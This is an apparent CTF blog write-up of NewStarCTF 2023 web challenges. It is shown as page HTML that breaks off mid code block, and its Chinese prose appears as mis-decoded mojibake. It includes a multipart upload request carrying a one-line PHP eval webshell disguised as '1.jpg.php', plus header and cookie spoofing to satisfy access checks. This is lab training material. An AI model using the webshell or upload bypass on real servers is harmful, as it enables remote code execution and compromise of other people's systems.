<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/acvtar.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/acvtar.jpg">
  <link rel="mask-icon" href="/images/acvtar.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.css" integrity="sha256-yE0aDX61mjiw8FoDuGetFttFoGJMeWsU/iYEFOfpMhA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"baozongwi.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="‰æùÊóßÊîæÊùæÔºå‰∏çÂØπÂä≤ÔºåÂ•ΩÂÉèÂπ∂‰∏çÊîæÊùæ">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF 2023 ÂÖ¨ÂºÄËµõÈÅì">
<meta property="og:url" content="https://baozongwi.xyz/posts/12220.html">
<meta property="og:site_name" content="baozongwi:H@cking Th3 Fu1ure">
<meta property="og:description" content="‰æùÊóßÊîæÊùæÔºå‰∏çÂØπÂä≤ÔºåÂ•ΩÂÉèÂπ∂‰∏çÊîæÊùæ">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/8/newstar2023/PixPin_2025-08-08_21-15-24.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/8/newstar2023/PixPin_2025-08-09_17-36-14.png">
<meta property="og:image" content="https://baozongwi.xyz/images/achieve/2025/8/newstar2023/PixPin_2025-08-09_20-28-43.png">
<meta property="article:published_time" content="2025-08-08T13:00:15.000Z">
<meta property="article:modified_time" content="2025-08-09T14:06:19.997Z">
<meta property="article:author" content="baozongwi">
<meta property="article:tag" content="php">
<meta property="article:tag" content="ssti">
<meta property="article:tag" content="mysql">
<meta property="article:tag" content="phar">
<meta property="article:tag" content="nodejs">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://baozongwi.xyz/images/achieve/2025/8/newstar2023/PixPin_2025-08-08_21-15-24.png">


<link rel="canonical" href="https://baozongwi.xyz/posts/12220.html">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://baozongwi.xyz/posts/12220.html","path":"posts/12220.html","title":"NewStarCTF 2023 ÂÖ¨ÂºÄËµõÈÅì"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>NewStarCTF 2023 ÂÖ¨ÂºÄËµõÈÅì | baozongwi:H@cking Th3 Fu1ure</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.0.17/fancybox/fancybox.umd.js" integrity="sha256-32A/chfN6JgQkwK/QFZY8siVcOZj3LUt1vSKIcDvshM=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>




  <script src="/js/third-party/fancybox.js" defer></script>

  <script src="/js/third-party/pace.js" defer></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="baozongwi:H@cking Th3 Fu1ure" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">baozongwi:H@cking Th3 Fu1ure</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="Searching..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="nav-number">1.</span> <span class="nav-text">Ê≥ÑÊºèÁöÑÁßòÂØÜ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Begin-of-Upload"><span class="nav-number">2.</span> <span class="nav-text">Begin of Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Begin-of-HTTP"><span class="nav-number">3.</span> <span class="nav-text">Begin of HTTP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ErrorFlask"><span class="nav-number">4.</span> <span class="nav-text">ErrorFlask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Begin-of-PHP"><span class="nav-number">5.</span> <span class="nav-text">Begin of PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#R-C-E"><span class="nav-number">6.</span> <span class="nav-text">R!C!E!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyLogin"><span class="nav-number">7.</span> <span class="nav-text">EasyLogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="nav-number">8.</span> <span class="nav-text">Ê∏∏ÊàèÈ´òÊâã</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#include-0%E3%80%820"><span class="nav-number">9.</span> <span class="nav-text">include 0„ÄÇ0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-sql"><span class="nav-number">10.</span> <span class="nav-text">ez_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unserialize%EF%BC%9F"><span class="nav-number">11.</span> <span class="nav-text">UnserializeÔºü</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Upload-again"><span class="nav-number">12.</span> <span class="nav-text">Upload again!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#R-C-E-1"><span class="nav-number">13.</span> <span class="nav-text">R!!C!!E!!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium-sql"><span class="nav-number">14.</span> <span class="nav-text">medium_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POP-Gadget"><span class="nav-number">15.</span> <span class="nav-text">POP Gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GenShin"><span class="nav-number">16.</span> <span class="nav-text">GenShin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OtenkiGirl"><span class="nav-number">17.</span> <span class="nav-text">OtenkiGirl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#InjectMe"><span class="nav-number">18.</span> <span class="nav-text">InjectMe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%83"><span class="nav-number">19.</span> <span class="nav-text">ÈÄÉ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#More-Fast"><span class="nav-number">20.</span> <span class="nav-text">More Fast</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#midsql"><span class="nav-number">21.</span> <span class="nav-text">midsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-disk"><span class="nav-number">22.</span> <span class="nav-text">flask disk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PharOne"><span class="nav-number">23.</span> <span class="nav-text">PharOne</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unserialize-Again"><span class="nav-number">24.</span> <span class="nav-text">Unserialize Again</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Final"><span class="nav-number">25.</span> <span class="nav-text">Final</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Final-round"><span class="nav-number">26.</span> <span class="nav-text">Final round</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ye%E2%80%99s-Pickle"><span class="nav-number">27.</span> <span class="nav-text">Ye‚Äôs Pickle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%A4%8D%E7%9B%98"><span class="nav-number">28.</span> <span class="nav-text">4-Â§çÁõò</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Give-me-your-photo-PLZ"><span class="nav-number">29.</span> <span class="nav-text">Give me your photo PLZ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsafe-Apache"><span class="nav-number">30.</span> <span class="nav-text">Unsafe Apache</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#So-Baby-RCE-Again"><span class="nav-number">31.</span> <span class="nav-text">So Baby RCE Again</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Include-%F0%9F%8D%90"><span class="nav-number">32.</span> <span class="nav-text">Include üçê</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#R-C-E-2"><span class="nav-number">33.</span> <span class="nav-text">R!!!C!!!E!!!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WebShell%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">34.</span> <span class="nav-text">WebShellÁöÑÂà©Áî®</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NextDrive"><span class="nav-number">35.</span> <span class="nav-text">NextDrive</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pppython"><span class="nav-number">36.</span> <span class="nav-text">pppython?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OtenkiBoy"><span class="nav-number">37.</span> <span class="nav-text">OtenkiBoy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%8A%E8%81%8A"><span class="nav-number">38.</span> <span class="nav-text">ËÅäËÅä</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="baozongwi"
      src="/images/acvtar.jpg">
  <p class="site-author-name" itemprop="name">baozongwi</p>
  <div class="site-description" itemprop="description">Â§©Âú∞‰∏ç‰ªÅÔºå‰ª•‰∏áÁâ©‰∏∫ÂàçÁãó</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/baozongwi" title="GitHub ‚Üí https:&#x2F;&#x2F;github.com&#x2F;baozongwi" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:baozongwi@qq.com" title="E-Mail ‚Üí mailto:baozongwi@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>
<ul>
  <li><a href="/"><i class="fa fa-home"></i> home</a></li>
  <li><a href="/archives/"><i class="fa fa-archive"></i> archives</a></li>
  <li><a href="/tags/"><i class="fa fa-tags"></i> tags</a></li>
  <li><a href="/about/"><i class="fa fa-user"></i> about</a></li>
  <li><a href="/links/"><i class="fa fa-link"></i> links</a></li>
</ul>
        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://baozongwi.xyz/posts/12220.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/acvtar.jpg">
      <meta itemprop="name" content="baozongwi">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="Â§©Âú∞‰∏ç‰ªÅÔºå‰ª•‰∏áÁâ©‰∏∫ÂàçÁãó">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="NewStarCTF 2023 ÂÖ¨ÂºÄËµõÈÅì | baozongwi:H@cking Th3 Fu1ure">
      <meta itemprop="description" content="‰æùÊóßÊîæÊùæÔºå‰∏çÂØπÂä≤ÔºåÂ•ΩÂÉèÂπ∂‰∏çÊîæÊùæ">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          NewStarCTF 2023 ÂÖ¨ÂºÄËµõÈÅì
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-08-08 21:00:15" itemprop="dateCreated datePublished" datetime="2025-08-08T21:00:15+08:00">2025-08-08</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-08-09 22:06:19" itemprop="dateModified" datetime="2025-08-09T22:06:19+08:00">2025-08-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">Â§çÁé∞</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>63k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>1:46</span>
    </span>
</div>

            <div class="post-description">‰æùÊóßÊîæÊùæÔºå‰∏çÂØπÂä≤ÔºåÂ•ΩÂÉèÂπ∂‰∏çÊîæÊùæ</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="Ê≥ÑÊºèÁöÑÁßòÂØÜ"><a href="#Ê≥ÑÊºèÁöÑÁßòÂØÜ" class="headerlink" title="Ê≥ÑÊºèÁöÑÁßòÂØÜ"></a>Ê≥ÑÊºèÁöÑÁßòÂØÜ</h2><p>ËÆøÈóÆ<code>www.zip</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> fileInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file = fileInput.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> allowedExtensions = [<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>];</span><br><span class="line">        <span class="keyword">var</span> fileExtension = file.<span class="property">name</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="title function_">pop</span>().<span class="title function_">toLowerCase</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;Please select a file to upload.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!allowedExtensions.<span class="title function_">includes</span>(fileExtension)) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;ÈîôËØØÁöÑÊãìÂ±ïÂêçÔºåÂè™ÂÖÅËÆ∏‰∏ä‰º†: JPG, JPEG, PNG, GIF&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ËøôÈáåÁöÑÊãìÂ±ïÂêçÊòØÂåÖÂê´Âç≥ÂèØ‰∏ç‰ºöÁÆ°‰ΩçÁΩÆ</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>307</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysNiLt38cRoeUSc87</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysNiLt38cRoeUSc87</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.jpg.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysNiLt38cRoeUSc87</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload!!!</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysNiLt38cRoeUSc87--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>

<h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?ctf=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node5.buuoj.cn:27312</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>NewStarCTF2023</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>newstarctf.com</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">X-Real-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>power=ctfer</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">secret</span><span class="operator">=</span>n3wst4rCTF2023g00000d</span></span><br></pre></td></tr></table></figure>

<h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>ÊµãËØï‰∏çÊòØSSTIÔºåÊä•ÈîôÂá∫‰∫Üflag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?number1=1&amp;number2=3=1</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/8/newstar2023/PixPin_2025-08-08_21-15-24.png"></p>
<h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>ÁªèÂÖ∏ÁöÑÂº±ÊØîËæÉÈóÆÈ¢ò</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 